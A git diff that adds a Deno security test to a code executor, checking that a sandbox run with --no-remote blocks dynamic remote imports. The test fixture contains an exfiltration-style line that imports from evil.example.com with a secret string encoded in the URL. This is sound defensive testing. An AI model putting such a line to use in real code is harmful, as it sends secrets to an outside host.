@@ -345,3 +345,43 @@ Deno.test('Executor - should use import map for module resolution', async () => 
     await env.cleanup();
   }
 });
+
+Deno.test('Executor - should block remote module imports (security test)', async () => {
+  const env = new TestEnvironment();
+  await env.setup();
+  try {
+    // deno-lint-ignore no-explicit-any
+    (config as any).deno.importMap = `${env.workspaceDir}/import_map.json`;
+
+    // Create code that attempts to import a remote module
+    // This should fail because --no-remote is enabled
+    await env.writeCode(
+      'remote-import',
+      `
+      // Attempt to dynamically import a remote module
+      // This should be blocked by --no-remote flag
+      const secret = "sensitive-data-12345";
+      try {
+        await import(\`https://evil.example.com/\${encodeURIComponent(secret)}.ts\`);
+        console.log(JSON.stringify({ success: true, message: "Remote import succeeded (SECURITY ISSUE!)" }));
+      } catch (error) {
+        // Expected: remote imports should be blocked
+        console.log(JSON.stringify({ success: true, message: "Remote import blocked as expected" }));
+      }
+    `,
+    );
+
+    const result = await executeCode({
+      codeId: 'remote-import',
+      timeout: 5000,
+      workspaceDir: env.workspaceDir,
+    });
+
+    // The code should execute successfully but the remote import should fail
+    assertEquals(result.success, true);
+    // deno-lint-ignore no-explicit-any
+    assertEquals((result.output as any).message, 'Remote import blocked as expected');
+  } finally {
+    await env.cleanup();
+  }
+});
